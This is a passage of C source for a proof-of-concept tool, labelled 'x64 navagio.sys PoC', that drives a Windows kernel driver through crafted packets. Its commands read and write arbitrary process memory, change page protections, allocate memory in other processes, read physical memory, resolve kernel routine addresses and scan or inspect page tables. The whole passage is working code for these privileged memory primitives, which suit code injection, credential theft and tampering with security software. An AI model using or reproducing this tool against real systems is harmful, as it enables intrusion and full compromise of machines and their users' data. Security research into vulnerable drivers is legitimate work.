    navagio_put_u64(packet.bytes + 0x28, (uintptr_t)buffer);
    navagio_put_u64(packet.bytes + 0x30, address);
    navagio_put_u64(packet.bytes + 0x38, size);
    navagio_put_u32(packet.bytes + 0x48, pid);
    packet.bytes[0x4c] = 1;
    return navagio_command(client, &packet);
}


static DWORD navagio_cache_dwm_process(poc* client, uint64_t* identifier) {
    navagio_packet packet;
    DWORD error;

    if (!identifier) {
        return ERROR_INVALID_PARAMETER;
    }
    *identifier = 0;
    initialize_extra(&packet, NAVAGIO_CMD_CACHE_DWM);
    error = navagio_command(client, &packet);
    if (!error) {
        *identifier = navagio_get_u64(packet.bytes + 0x28);
    }
    return error;
}


static DWORD record_array(poc* client, uint32_t command, void* records, uint32_t* count, uint32_t maximum) {
    navagio_packet packet;
    uint32_t capacity;
    DWORD error;

    if (!count || *count > maximum || (*count && !records)) {
        return ERROR_INVALID_PARAMETER;
    }
    capacity = *count;
    initialize_extra(&packet, command);
    navagio_put_u32(packet.bytes + 0x28, capacity);
    navagio_put_u64(packet.bytes + 0x30, (uintptr_t)records);
    error = navagio_command(client, &packet);
    if (!error || error == ERROR_INSUFFICIENT_BUFFER) {
        *count = navagio_get_u32(packet.bytes + 0x28);
        if (!error && *count > capacity) {
            return ERROR_INVALID_DATA;
        }
    }
    else if (error == ERROR_NO_MORE_ITEMS) {
        *count = 0;
    }
    return error;
}


static DWORD navagio_get_image_records(poc* client, navagio_image_record* records, uint32_t* count) {
    uint32_t i;
    DWORD error;

    if (!count || !*count) {
        return ERROR_INVALID_PARAMETER;
    }
    error = record_array(client, NAVAGIO_CMD_IMAGE_RECORDS, records, count, 16384);
    if (!error) {
        for (i = 0; i < *count; ++i) {
            records[i].name[260] = 0;
            records[i].path[260] = 0;
        }
    }
    return error;
}


static DWORD navagio_get_image_record_by_name(poc* client, const wchar_t* name, navagio_image_record* record) {
    size_t length;
    uint32_t count = 1;
    DWORD error;

    if (!record || !name || !(length = wcsnlen_s(name, 261)) || length >= 261) {
        return ERROR_INVALID_PARAMETER;
    }
    memset(record, 0, sizeof(*record));
    memcpy(record->name, name, length * sizeof(*name));
    error = record_array(client, NAVAGIO_CMD_IMAGE_RECORD_BY_NAME, record, &count, 1);
    if (!error && count != 1) {
        return ERROR_NOT_FOUND;
    }
    if (!error) {
        record->name[260] = 0;
        record->path[260] = 0;
    }
    return error;
}


static DWORD navagio_get_nmi_records(poc* client, navagio_nmi_record* records, uint32_t* count) {
    uint32_t required = 0;
    DWORD error;

    if (!count || *count > 4096 || (*count && !records)) {
        return ERROR_INVALID_PARAMETER;
    }
    if (*count) {

        error = record_array(client, NAVAGIO_CMD_NMI_RECORDS, NULL, &required, 4096);
        if (error != ERROR_INSUFFICIENT_BUFFER) {
            return error ? error : ERROR_INVALID_DATA;
        }
        if (!required || required > 4096) {
            return ERROR_INVALID_DATA;
        }
        if (*count < required) {
            *count = required;
            return ERROR_INSUFFICIENT_BUFFER;
        }
    }
    return record_array(client, NAVAGIO_CMD_NMI_RECORDS, records, count, 4096);
}


static DWORD scan(poc* client, uint32_t command, uint64_t address, size_t size, const wchar_t* name, const navagio_scan_options* options, navagio_scan_record* records, uint32_t* count) {
    navagio_packet packet;
    size_t offset = command == NAVAGIO_CMD_SCAN_IMAGE ? 0x230 : 0x38;
    size_t name_length = 0;
    uint32_t capacity;
    DWORD error;

    if (!options || !options->pattern_size || options->pattern_size > 64 || !records || !count || !*count || *count > 16384 ||
        (options->process_mode && !options->pid && !options->process_identifier)) {
        return ERROR_INVALID_PARAMETER;
    }
    if (command == NAVAGIO_CMD_SCAN_IMAGE) {
        if (!name || !(name_length = wcsnlen_s(name, 260)) || name_length >= 260) {
            return ERROR_INVALID_PARAMETER;
        }
    }
    else if (!size || size > MAX_TRANSFER || address > UINT64_MAX - (size - 1u)) {
        return ERROR_INVALID_PARAMETER;
    }
    if (command == NAVAGIO_CMD_SCAN_PHYSICAL && (options->process_mode || options->pid || options->process_identifier)) {
        return ERROR_INVALID_PARAMETER;
    }
    capacity = *count;
    initialize_extra(&packet, command);
    if (name_length) {
        memcpy(packet.bytes + 0x28, name, name_length * sizeof(*name));
    }
    else {
        navagio_put_u64(packet.bytes + 0x28, address);
        navagio_put_u64(packet.bytes + 0x30, size);
    }
    memcpy(packet.bytes + offset, options->pattern, options->pattern_size);
    navagio_put_u32(packet.bytes + offset + 0x40, options->pattern_size);
    navagio_put_u32(packet.bytes + offset + 0x44, capacity);
    packet.bytes[offset + 0x48] = options->match_byte;
    packet.bytes[offset + 0x49] = options->mode;
    if (command == NAVAGIO_CMD_SCAN_PHYSICAL) {
        packet.bytes[0x82] = options->match_mode;
        navagio_put_u32(packet.bytes + 0x84, options->parameter);
        navagio_put_u64(packet.bytes + 0x88, (uintptr_t)records);
    }
    else {
        packet.bytes[offset + 0x4a] = options->process_mode;
        packet.bytes[offset + 0x4b] = options->match_mode;
        navagio_put_u32(packet.bytes + offset + 0x4c, options->parameter);
        navagio_put_u64(packet.bytes + offset + 0x50, options->process_identifier);
        navagio_put_u32(packet.bytes + offset + 0x58, options->pid);
        navagio_put_u64(packet.bytes + offset + 0x60, (uintptr_t)records);
    }
    error = navagio_command(client, &packet);
    if (!error) {
        *count = navagio_get_u32(packet.bytes + offset + 0x44);
        if (*count > capacity) {
            return ERROR_INVALID_DATA;
        }
    }
    return error;
}


static DWORD navagio_scan_memory(poc* client, uint64_t address, size_t size, const navagio_scan_options* options, navagio_scan_record* records, uint32_t* count) {
    return scan(client, NAVAGIO_CMD_SCAN_MEMORY, address, size, NULL, options, records, count);
}


static DWORD navagio_scan_physical(poc* client, uint64_t address, size_t size, const navagio_scan_options* options, navagio_scan_record* records, uint32_t* count) {
    return scan(client, NAVAGIO_CMD_SCAN_PHYSICAL, address, size, NULL, options, records, count);
}


static DWORD navagio_scan_image(poc* client, const wchar_t* name, const navagio_scan_options* options, navagio_scan_record* records, uint32_t* count) {
    return scan(client, NAVAGIO_CMD_SCAN_IMAGE, 0, 0, name, options, records, count);
}


static DWORD navagio_inspect_pages(poc* client, uint32_t pid, uint64_t begin, uint64_t end, uint32_t flags, uint32_t parameter, uint32_t* result) {
    navagio_packet packet;

    if (!pid || !result || begin >= end) {
        return ERROR_INVALID_PARAMETER;
    }
    *result = UINT32_MAX;
    initialize_extra(&packet, NAVAGIO_CMD_INSPECT_PAGES);
    navagio_put_u32(packet.bytes + 0x30, pid);
    navagio_put_u32(packet.bytes + 0x34, flags);
    navagio_put_u64(packet.bytes + 0x38, begin);
    navagio_put_u64(packet.bytes + 0x40, end);
    navagio_put_u32(packet.bytes + 0x48, parameter);
    navagio_put_u64(packet.bytes + 0x50, (uintptr_t)result);
    return navagio_command(client, &packet);
}


static void navagio_commands_usage(void) {
    puts("Additional commands (PID accepts 'self'; numbers accept 0x prefixes):\n"
        "  version                           Query protocol family/revision\n"
        "  open-process PID [attached]        Obtain and verify a process handle\n"
        "  alloc PID SIZE [PROTECT]           Allocate committed virtual memory\n"
        "  free PID ADDRESS                   Release an entire allocation\n"
        "  query PID ADDRESS                  Query virtual memory attributes\n"
        "  protect PID ADDRESS SIZE PROTECT   Change virtual memory protection\n"
        "  read PID ADDRESS SIZE FILE         Save process memory (max 64 MiB)\n"
        "  write PID ADDRESS FILE             Write file bytes (max 64 MiB)\n"
        "  process-info PID                   Query a cached process record\n"
        "  process-info-id ID                 Query by an opaque cached ID\n"
        "  processes                          List cached PID, parent PID, path\n"
        "  process-ids                        List opaque cached object IDs\n"
        "  resolve NAME                       Resolve an exported kernel routine\n"
        "  notify-process PID                 Submit an 80-byte process notification\n"
        "  next-event [TYPE] [FILE]            Consume an event (TYPE: 0, 1, 2)\n"
        "  init-features [ID ...]              Initialize up to 8 driver features\n"
        "  read-physical ADDRESS SIZE FILE    Save physical memory\n"
        "  bus-configs FILE                   Save device configuration records\n"
        "  nvxe-configure PID PARAM FILE [AUX] Upload an NVXE configuration\n"
        "  nvxe-clear                         Clear ALL NVXE configurations\n"
        "  read-via-physical PID ADDR SIZE FILE Alternate process-memory read\n"
        "  cache-dwm                          Cache this session's DWM process\n"
        "  images FILE [CAPACITY]             Save image-cache records\n"
        "  image NAME FILE                   Save one cached image record\n"
        "  nmi-capacity                       Query NMI capacity without collection\n"
        "  nmi FILE                          Collect NMI diagnostic records\n"
        "  scan-memory PID ADDR SIZE PAT FILE [COUNT BYTE MODE MATCH PARAM]\n"
        "  scan-physical ADDR SIZE PAT FILE   [COUNT BYTE MODE MATCH PARAM]\n"
        "  scan-image PID NAME PAT FILE       [COUNT BYTE MODE MATCH PARAM]\n"
        "    PAT is a 1..64-byte pattern file; FILE receives 80-byte records.\n"
        "    scan-image PID=0 selects kernel context. Options are driver-specific.\n"
        "  inspect-pages PID BEGIN END FLAGS [PARAM]  Inspect page-table range\n");
}


static int number(const wchar_t* text, uint64_t* value) {
    wchar_t* end;

    if (!text[0] || text[0] == L'-' || text[0] == L'+' || iswspace(text[0])) {
        return 0;
    }
    errno = 0;
    *value = wcstoull(text, &end, text[0] == L'0' && (text[1] == L'x' || text[1] == L'X') ? 16 : 10);
    return !errno && end != text && !*end;
}


static int pid_number(const wchar_t* text, uint32_t* pid) {
    uint64_t value;

    if (!wcscmp(text, L"self")) {
        *pid = GetCurrentProcessId();
        return 1;
    }
    if (!number(text, &value) || !value || value > UINT32_MAX) {
        return 0;
    }
    *pid = (uint32_t)value;
    return 1;
}


static int read_bytes(const wchar_t* path, uint8_t** data, size_t* size) {
    FILE* file = NULL;
    __int64 length;
    int ok;

    if (_wfopen_s(&file, path, L"rb") || !file) {
        return 0;
    }
    if (_fseeki64(file, 0, SEEK_END) || (length = _ftelli64(file)) < 1 || length > MAX_TRANSFER || _fseeki64(file, 0, SEEK_SET)) {
        fclose(file);
        return 0;
    }
    *size = (size_t)length;
    *data = (uint8_t*)malloc(*size);
    ok = *data && fread(*data, 1, *size, file) == *size;
    if (fclose(file)) {
        ok = 0;
    }
    if (!ok) {
        free(*data);
        *data = NULL;
    }
    return ok;
}


static int write_bytes(const wchar_t* path, const void* data, size_t size) {
    FILE* file = NULL;
    int ok;

    if (_wfopen_s(&file, path, L"wb") || !file) {
        return 0;
    }
    ok = !size || fwrite(data, 1, size, file) == size;
    if (fclose(file)) {
        ok = 0;
    }
    return ok;
}


static int extra_cli(const wchar_t* cmd, int argc, wchar_t** args, const wchar_t* path, int* handled) {
    enum {
        NOTIFY,
        EVENT,
        FEATURES,
        PHYSICAL,
        BUS,
        NVXE,
        CLEAR,
        ALTERNATE_READ,
        DWM,
        IMAGES,
        IMAGE,
        NMI,
        NMI_CAPACITY,
        SCAN_MEMORY,
        SCAN_PHYSICAL,
        SCAN_IMAGE,
        PAGES,
        UNKNOWN
    } kind;

    static const wchar_t* const names[] = { L"notify-process", L"next-event",        L"init-features", L"read-physical", L"bus-configs",   L"nvxe-configure",
                                           L"nvxe-clear",     L"read-via-physical", L"cache-dwm",     L"images",        L"image",         L"nmi",
                                           L"nmi-capacity",   L"scan-memory",       L"scan-physical", L"scan-image",    L"inspect-pages" };
    poc client;
    uint32_t pid = 0, ids[8], count = 0, examined = 0, i;
    uint64_t address = 0, length = 0, parameter = 0, flags = 0;
    navagio_scan_options options = { 0 };
    const wchar_t* output = NULL;
    uint8_t* data = NULL, * auxiliary = NULL;
    size_t size = 0, auxiliary_size = 0;
    DWORD error;
    int result = 0;
    for (kind = NOTIFY; kind < UNKNOWN; kind = static_cast<decltype(kind)>(static_cast<int>(kind) + 1)) {
        if (!wcscmp(cmd, names[kind])) {
            break;
        }
    }
    *handled = kind != UNKNOWN;
    if (!*handled) {
        return 0;
    }
    switch (kind) {
    case NOTIFY:
        if (argc != 1 || !pid_number(args[0], &pid)) {
            goto bad_args;
        }
        break;
    case EVENT:
        if (argc > 2 || (argc && (!number(args[0], &parameter) || parameter > 2))) {
            goto bad_args;
        }
        break;
    case FEATURES:
        if (argc > 8) {
            goto bad_args;
        }
        for (i = 0; i < (uint32_t)argc; ++i) {
            if (!number(args[i], &parameter) || (parameter != 100 && parameter != 101 && parameter != 105 && parameter != 106 && parameter != 107 && parameter != 999)) {
                goto bad_args;
            }
            ids[i] = (uint32_t)parameter;
        }
        break;
    case PHYSICAL:
        if (argc != 3 || !number(args[0], &address) || !number(args[1], &length) || !length || length > MAX_TRANSFER || address > UINT64_MAX - (length - 1)) {
            goto bad_args;
        }
        size = (size_t)length;
        data = (uint8_t*)calloc(1, size);
        if (!data) {
            goto bad_args;
        }
        break;
    case ALTERNATE_READ:
        if (argc != 4 || !pid_number(args[0], &pid) || !number(args[1], &address) || !address || !number(args[2], &length) || !length || length > MAX_TRANSFER || address > UINT64_MAX - (length - 1)) {
            goto bad_args;
        }
        size = (size_t)length;
        data = (uint8_t*)calloc(1, size);
        if (!data) {
            goto bad_args;
        }
        break;
    case BUS:
        if (argc != 1) {
            goto bad_args;
        }
        break;
    case NVXE:
        if (argc < 3 || argc > 4 || !pid_number(args[0], &pid) || !number(args[1], &parameter) || !read_bytes(args[2], &data, &size) || size < 32 ||
            (argc == 4 && !read_bytes(args[3], &auxiliary, &auxiliary_size))) {
            goto bad_args;
        }
        break;
    case CLEAR:
    case DWM:
    case NMI_CAPACITY:
        if (argc) {
            goto bad_args;
        }
        break;
    case IMAGES:
        count = 4096;
        if (argc < 1 || argc > 2 || (argc == 2 && (!number(args[1], &length) || !length || length > 16384))) {
            goto bad_args;
        }
        if (argc == 2) {
            count = (uint32_t)length;
        }
        break;
    case IMAGE:
        if (argc != 2 || !args[0][0] || wcsnlen_s(args[0], 261) >= 261) {
            goto bad_args;
        }
        break;
    case NMI:
        if (argc != 1) {
            goto bad_args;
        }
        break;
    case SCAN_MEMORY:
    case SCAN_PHYSICAL:
    case SCAN_IMAGE: {
        int base = kind == SCAN_MEMORY ? 5 : 4;
        int pattern_arg = base - 2;
        uint64_t values[5] = { 1024, 0, 0, 0, 0 };
        if (argc < base || argc > base + 5) {
            goto bad_args;
        }
        if (kind != SCAN_PHYSICAL) {
            if (kind != SCAN_IMAGE || wcscmp(args[0], L"0")) {
                if (!pid_number(args[0], &pid)) {
                    goto bad_args;
                }
                options.pid = pid;
                options.process_mode = 1;
            }
        }
        if (kind == SCAN_IMAGE) {
            if (!args[1][0] || wcsnlen_s(args[1], 260) >= 260) {
                goto bad_args;
            }
        }
        else {
            int start = kind == SCAN_MEMORY ? 1 : 0;
            if (!number(args[start], &address) || !number(args[start + 1], &length) || !length || length > MAX_TRANSFER || address > UINT64_MAX - (length - 1)) {
                goto bad_args;
            }
        }
        if (!read_bytes(args[pattern_arg], &data, &size) || size > 64) {
            goto bad_args;
        }
        options.pattern_size = (uint32_t)size;
        memcpy(options.pattern, data, size);
        free(data);
        data = NULL;
        for (i = 0; i < (uint32_t)(argc - base); ++i) {
            if (!number(args[base + i], &values[i])) {
                goto bad_args;
            }
        }
        if (!values[0] || values[0] > 16384 || values[1] > 255 || values[2] > 255 || values[3] > 255 || values[4] > UINT32_MAX) {
            goto bad_args;
        }
        count = (uint32_t)values[0];
        options.match_byte = (uint8_t)values[1];
        options.mode = (uint8_t)values[2];
        options.match_mode = (uint8_t)values[3];
        options.parameter = (uint32_t)values[4];
        output = args[base - 1];
        break;
    }
    case PAGES:
        if (argc < 4 || argc > 5 || !pid_number(args[0], &pid) || !number(args[1], &address) || !number(args[2], &length) || address >= length || !number(args[3], &flags) || flags > UINT32_MAX ||
            (argc == 5 && (!number(args[4], &parameter) || parameter > UINT32_MAX))) {
            goto bad_args;
        }
        break;
    default:
        return 0;
    }
    error = navagio_open(&client, path);
    if (error) {
        fprintf(stderr, "FAIL open: Win32=%lu\n", error);
        result = 1;
        goto cleanup;
    }
    error = kind == NOTIFY ? ERROR_SUCCESS : navagio_register(&client);
    if (error) {
        goto done;
    }
    switch (kind) {
    case NOTIFY:
        error = navagio_notify_process(&client, pid);
        if (!error) {
            puts("Notification transport acknowledged (no operation status).");
        }
        break;
    case EVENT: {
        navagio_event event;
        error = navagio_next_event(&client, (uint32_t)parameter, &event);
        if (error == ERROR_NO_MORE_ITEMS) {
            puts("No pending event.");
            error = ERROR_SUCCESS;
        }
        else if (!error) {
            printf("type=%lu fields=%08lx,%08lx,%08lx,%08lx\n", (unsigned long)event.type, (unsigned long)event.fields[0], (unsigned long)event.fields[1], (unsigned long)event.fields[2],
                (unsigned long)event.fields[3]);
            if (argc == 2 && !write_bytes(args[1], &event, sizeof(event))) {
                error = ERROR_WRITE_FAULT;
            }
        }
        break;
    }
    case FEATURES:
        error = navagio_initialize_features(&client, ids, (uint32_t)argc);
        if (!error) {
            printf("PASS initialize: %d feature IDs\n", argc);
        }
        break;
    case PHYSICAL:
        error = navagio_read_physical(&client, address, data, size);
        if (!error && !write_bytes(args[2], data, size)) {
            error = ERROR_WRITE_FAULT;
        }
        if (!error) {
            printf("PASS physical read: %zu bytes saved\n", size);
        }
        break;
    case BUS: {
        navagio_bus_config* records = NULL;
        error = navagio_get_bus_configs(&client, NULL, &count, &examined);
        for (i = 0; error == ERROR_INSUFFICIENT_BUFFER && i < 3; ++i) {
            if (!count || count > 4096) {
                error = ERROR_BAD_LENGTH;
                break;
            }
            free(records);
            records = (navagio_bus_config*)calloc(count, sizeof(*records));
            if (!records) {
                error = ERROR_NOT_ENOUGH_MEMORY;
            }
            else {
                error = navagio_get_bus_configs(&client, records, &count, &examined);
            }
        }
        if (error == ERROR_NO_MORE_ITEMS) {
            error = ERROR_SUCCESS;
            count = 0;
        }
        if (!error && !write_bytes(args[0], records, (size_t)count * sizeof(*records))) {
            error = ERROR_WRITE_FAULT;
        }
        if (!error) {
            printf("examined=%lu records=%lu record_size=%zu\n", (unsigned long)examined, (unsigned long)count, sizeof(*records));
        }
        free(records);
        break;
    }
    case NVXE:
        error = navagio_nvxe_configure(&client, pid, parameter, data, size, auxiliary, auxiliary_size);
        if (!error) {
            puts("PASS NVXE configuration accepted");
        }
        break;
    case CLEAR:
        error = navagio_nvxe_clear(&client);
        if (!error) {
            puts("PASS all NVXE configurations cleared");
        }
        break;
    case ALTERNATE_READ:
        error = navagio_read_memory_physical(&client, pid, address, data, size);
        if (!error && !write_bytes(args[3], data, size)) {
            error = ERROR_WRITE_FAULT;
        }
        if (!error) {
            printf("PASS alternate read: %zu bytes saved\n", size);
        }
        break;
    case DWM:
        error = navagio_cache_dwm_process(&client, &address);
        if (!error) {
            printf("cached_id=0x%016llx\n", (unsigned long long)address);
        }
        break;
    case IMAGES: {
        navagio_image_record* records = (navagio_image_record*)calloc(count, sizeof(*records));
        uint32_t capacity = count;
        if (!records) {
            error = ERROR_NOT_ENOUGH_MEMORY;
        }
        else {
            error = navagio_get_image_records(&client, records, &count);
        }
        if (error == ERROR_NO_MORE_ITEMS) {
            error = ERROR_SUCCESS;
            count = 0;
        }
        if (!error && !write_bytes(args[0], records, (size_t)count * sizeof(*records))) {
            error = ERROR_WRITE_FAULT;
        }
        if (!error) {
            printf("image_records=%lu capacity=%lu%s\n", (unsigned long)count, (unsigned long)capacity, count == capacity ? " (capacity reached)" : "");
        }
        free(records);
        break;
    }
    case IMAGE: {
        navagio_image_record record;
        error = navagio_get_image_record_by_name(&client, args[0], &record);
        if (!error && !write_bytes(args[1], &record, sizeof(record))) {
            error = ERROR_WRITE_FAULT;
        }
        if (!error) {
            puts("PASS image record saved");
        }
        break;
    }
    case NMI:
    case NMI_CAPACITY: {
        navagio_nmi_record* records = NULL;
        error = navagio_get_nmi_records(&client, NULL, &count);
        if (!error) {
            error = ERROR_INVALID_DATA;
        }
        if (kind == NMI_CAPACITY && error == ERROR_INSUFFICIENT_BUFFER) {
            printf("required_records=%lu\n", (unsigned long)count);
            error = ERROR_SUCCESS;
        }
        else if (kind == NMI && error == ERROR_INSUFFICIENT_BUFFER) {
            if (!count || count > 4096) {
                error = ERROR_BAD_LENGTH;
            }
            else {
                records = (navagio_nmi_record*)calloc(count, sizeof(*records));
                error = records ? navagio_get_nmi_records(&client, records, &count) : ERROR_NOT_ENOUGH_MEMORY;
                if (!error && !write_bytes(args[0], records, (size_t)count * sizeof(*records))) {
                    error = ERROR_WRITE_FAULT;
                }
                if (!error) {
                    printf("nmi_records=%lu\n", (unsigned long)count);
                }
            }
        }
        free(records);
        break;
    }
    case SCAN_MEMORY:
    case SCAN_PHYSICAL:
    case SCAN_IMAGE: {
        navagio_scan_record* records = (navagio_scan_record*)calloc(count, sizeof(*records));
        uint32_t capacity = count;
        if (!records) {
            error = ERROR_NOT_ENOUGH_MEMORY;
        }
        else if (kind == SCAN_MEMORY) {
            error = navagio_scan_memory(&client, address, (size_t)length, &options, records, &count);
        }
        else if (kind == SCAN_PHYSICAL) {
            error = navagio_scan_physical(&client, address, (size_t)length, &options, records, &count);
        }
        else {
            error = navagio_scan_image(&client, args[1], &options, records, &count);
        }
        if (!error && !write_bytes(output, records, (size_t)count * sizeof(*records))) {
            error = ERROR_WRITE_FAULT;
        }
        if (!error) {
            printf("scan_records=%lu%s\n", (unsigned long)count, count == capacity ? " (capacity reached)" : "");
        }
        free(records);
        break;
    }
    case PAGES:
        error = navagio_inspect_pages(&client, pid, address, length, (uint32_t)flags, (uint32_t)parameter, &count);
        printf("operation_result=%lu\n", (unsigned long)count);
        break;
    default:
        break;
    }
done:
    if (error) {
        fprintf(stderr, "FAIL %ls: Win32=%lu driver=%lu\n", cmd, error, (unsigned long)client.last_driver_status);
        result = 1;
    }
    if (navagio_close(&client)) {
        result = 1;
    }
cleanup:
    free(auxiliary);
    free(data);
    return result;
bad_args:
    fputs("Invalid command arguments.\n", stderr);
    navagio_commands_usage();
    free(auxiliary);
    free(data);
    return 2;
}


static int navagio_commands_cli(int argc, wchar_t** argv, int pos, const wchar_t* path, int* handled) {
    const wchar_t* cmd = argv[pos++];
    int remaining = argc - pos, method = 0, result = 0;
    int version = !wcscmp(cmd, L"version");
    int open = !wcscmp(cmd, L"open-process"), alloc = !wcscmp(cmd, L"alloc");
    int release = !wcscmp(cmd, L"free"), query = !wcscmp(cmd, L"query");
    int protect = !wcscmp(cmd, L"protect"), read = !wcscmp(cmd, L"read");
    int write = !wcscmp(cmd, L"write"), list = !wcscmp(cmd, L"process-ids");
    int records = !wcscmp(cmd, L"processes"), record = !wcscmp(cmd, L"process-info");
    int record_id = !wcscmp(cmd, L"process-info-id");
    int resolve = !wcscmp(cmd, L"resolve");
    uint32_t pid = 0, protection = PAGE_READWRITE, old_protection = 0;
    uint64_t address = 0, length = 0, value;
    size_t size = 0, transferred = 0;
    uint8_t* data = NULL;
    poc client;
    navagio_version info;
    MEMORY_BASIC_INFORMATION memory;
    HANDLE process = NULL;
    DWORD error;

    *handled = version || open || alloc || release || query || protect || read || write || list || records || record || record_id || resolve;
    if (!*handled) {
        return extra_cli(cmd, remaining, argv + pos, path, handled);
    }
    if (version || list || records) {
        if (remaining) {
            goto bad_args;
        }
    }
    else if (record || record_id || resolve) {
        if (remaining != 1 || (record && !pid_number(argv[pos], &pid))) {
            goto bad_args;
        }
        if (record_id && (!number(argv[pos], &address) || !address)) {
            goto bad_args;
        }
        if (resolve && (!argv[pos][0] || wcsnlen_s(argv[pos], 80) >= 80)) {
            goto bad_args;
        }
    }
    else if (open) {
        if (remaining < 1 || remaining > 2 || !pid_number(argv[pos], &pid)) {
            goto bad_args;
        }
        if (remaining == 2) {
            if (wcscmp(argv[pos + 1], L"attached")) {
                goto bad_args;
            }
            method = 1;
        }
    }
    else if (alloc) {
        if (remaining < 2 || remaining > 3 || !pid_number(argv[pos], &pid) || !number(argv[pos + 1], &length) || !length) {
            goto bad_args;
        }
        size = (size_t)length;
        if (remaining == 3) {
            if (!number(argv[pos + 2], &value) || value > UINT32_MAX) {
                goto bad_args;
            }
            protection = (uint32_t)value;
        }
    }
    else {
        int expected = (release || query) ? 2 : write ? 3 : 4;
        if (remaining != expected || !pid_number(argv[pos], &pid) || !number(argv[pos + 1], &address)) {
            goto bad_args;
        }
        if (!address && !query) {
            goto bad_args;
        }
        if (read || protect) {
            if (!number(argv[pos + 2], &length) || !length) {
                goto bad_args;
            }
            size = (size_t)length;
        }
        if (protect) {
            if (!number(argv[pos + 3], &value) || value > UINT32_MAX) {
                goto bad_args;
            }
            protection = (uint32_t)value;
        }
        if (read) {
            if (size > MAX_TRANSFER || !(data = (uint8_t*)calloc(1, size))) {
                goto bad_args;
            }
        }
        if (write && !read_bytes(argv[pos + 2], &data, &size)) {
            fputs("Input file must contain 1..67108864 bytes.\n", stderr);
            goto bad_args;
        }
    }
    error = navagio_open(&client, path);
    if (error) {
        fprintf(stderr, "FAIL open: Win32=%lu\n", error);
        free(data);
        return 1;
    }
    error = navagio_register(&client);
    if (error) {
        goto done;
    }
    if (version) {
        error = navagio_get_version(&client, &info);
        if (!error) {
            printf("family=%lu revision=0x%lx\n", (unsigned long)info.family, (unsigned long)info.revision);
        }
    }
    else if (open) {
        error = navagio_open_process(&client, pid, method, &process);
        if (!error) {
            DWORD actual_pid = GetProcessId(process);
            if (actual_pid != pid) {
                error = ERROR_INVALID_DATA;
            }
            else {
                printf("PASS process handle: PID=%lu (closed on exit)\n", actual_pid);
            }
        }
    }
    else if (alloc) {
        error = navagio_allocate_memory(&client, pid, &address, &size, MEM_COMMIT | MEM_RESERVE, protection);
        if (!error) {
            printf("address=0x%llx size=%zu\n", (unsigned long long)address, size);
        }
    }
    else if (release) {
        error = navagio_free_memory(&client, pid, &address, &size, MEM_RELEASE);
        if (!error) {
            puts("PASS free");
        }
    }
    else if (query) {
        error = navagio_query_memory(&client, pid, address, &memory);
        if (!error) {
            printf("base=%p allocation=%p size=%zu state=0x%lx protect=0x%lx type=0x%lx\n", memory.BaseAddress, memory.AllocationBase, memory.RegionSize, memory.State, memory.Protect, memory.Type);
        }
    }
    else if (protect) {
        error = navagio_protect_memory(&client, pid, &address, &size, protection, &old_protection);
        if (!error) {
            printf("address=0x%llx size=%zu old_protect=0x%lx\n", (unsigned long long)address, size, (unsigned long)old_protection);
        }
    }
    else if (read) {
        error = navagio_read_memory(&client, pid, address, data, size, &transferred);
        if (!error && !write_bytes(argv[pos + 3], data, transferred)) {
            error = ERROR_WRITE_FAULT;
        }
        if (!error) {
            printf("PASS read: %zu bytes saved\n", transferred);
        }
    }
    else if (write) {
        error = navagio_write_memory(&client, pid, address, data, size, &transferred);
        if (!error) {
            printf("PASS write: %zu bytes\n", transferred);
        }
    }
    else if (list) {
        uint32_t count = 0, capacity = 0, i, attempt;
        uint64_t* objects = NULL;
        error = navagio_get_process_ids(&client, NULL, &count);
        for (attempt = 0; error == ERROR_INSUFFICIENT_BUFFER && attempt < 3; ++attempt) {
            if (!count || count > 1048576u) {
                error = ERROR_BAD_LENGTH;
                break;
            }
            capacity = count;
            free(objects);
            objects = (uint64_t*)calloc(capacity, sizeof(*objects));
            if (!objects) {
                error = ERROR_NOT_ENOUGH_MEMORY;
            }
            else {
                error = navagio_get_process_ids(&client, objects, &count);
            }
        }
        if (error == ERROR_NO_MORE_ITEMS) {
            error = ERROR_SUCCESS;
        }
        if (!error) {
            printf("cached_ids=%lu\n", (unsigned long)count);
            for (i = 0; i < count && i < capacity; ++i) {
                printf("0x%016llx\n", (unsigned long long)objects[i]);
            }
        }
        free(objects);
    }
    else if (records) {
        uint32_t count = 0, capacity = 0, i, attempt;
        navagio_process_info* items = NULL;
        error = navagio_get_process_records(&client, NULL, &count);
        for (attempt = 0; error == ERROR_INSUFFICIENT_BUFFER && attempt < 3; ++attempt) {
            if (!count || count > 16384u) {
                error = ERROR_BAD_LENGTH;
                break;
            }
            capacity = count;
            free(items);
            items = (navagio_process_info*)calloc(capacity, sizeof(*items));
            if (!items) {
                error = ERROR_NOT_ENOUGH_MEMORY;
            }
            else {
                error = navagio_get_process_records(&client, items, &count);
            }
        }
        if (error == ERROR_NO_MORE_ITEMS) {
            error = ERROR_SUCCESS;
        }
        if (!error) {
            printf("cached_processes=%lu\n", (unsigned long)count);
            for (i = 0; i < count && i < capacity; ++i) {
                printf("%lu\t%lu\t%ls\n", (unsigned long)items[i].pid, (unsigned long)items[i].parent_pid, items[i].image_path);
            }
        }
        free(items);
    }
    else if (record || record_id) {
        navagio_process_info item;
        error = record ? navagio_get_process_info(&client, pid, &item) : navagio_get_process_info_by_id(&client, address, &item);
        if (!error) {
            printf("pid=%lu parent=%lu creation=%llu peb=0x%llx\nimage=%ls\n", (unsigned long)item.pid, (unsigned long)item.parent_pid, (unsigned long long)item.creation_time,
                (unsigned long long)item.peb, item.image_path);
        }
    }
    else if (resolve) {
        error = navagio_system_routine(&client, argv[pos], &address);
        if (!error) {
            printf("%ls=0x%016llx\n", argv[pos], (unsigned long long)address);
        }
    }
done:
    if (error) {
        fprintf(stderr, "FAIL %ls: Win32=%lu driver=%lu NTSTATUS=0x%08lx\n", cmd, error, (unsigned long)client.last_driver_status, (unsigned long)(uint32_t)client.last_ntstatus);
        result = 1;
    }
    if (process && !CloseHandle(process)) {
        result = 1;
    }
    if (navagio_close(&client)) {
        result = 1;
    }
    free(data);
    return result;
bad_args:
    fputs("Invalid command arguments.\n", stderr);
    navagio_commands_usage();
    free(data);
    return 2;
}

static void usage(void) {
    puts("poc: x64 navagio.sys PoC\n"
        "Usage: poc [--device PATH] COMMAND\n"
        "  ping [COUNT]                 Register and validate ping replies (1..1000)\n"
        "  exchange REQUEST RESPONSE    Send a decoded 664-byte packet file;\n"
        "                               save the decoded reply (auto-register)\n"
        "  --help                       Show this help");
    navagio_commands_usage();
}


static int report_error(const char* operation, DWORD error) {
    wchar_t message[512] = { 0 };

